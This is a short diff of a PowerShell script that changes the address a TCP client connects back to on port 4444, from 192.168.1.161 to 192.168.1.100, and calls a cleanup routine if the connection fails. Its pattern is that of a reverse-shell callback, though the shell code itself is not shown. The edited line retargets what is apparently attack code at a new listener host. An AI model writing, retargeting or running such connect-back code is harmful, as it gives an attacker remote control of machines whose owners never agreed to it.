@@ -11,7 +11,7 @@ function CleanUp {
 }
 
 $client = New-Object System.Net.Sockets.TcpClient
-$client.Connect('192.168.1.161', 4444)
+$client.Connect('192.168.1.100', 4444)
 
 if ($client.Connected -ne $true) {
 	CleanUp
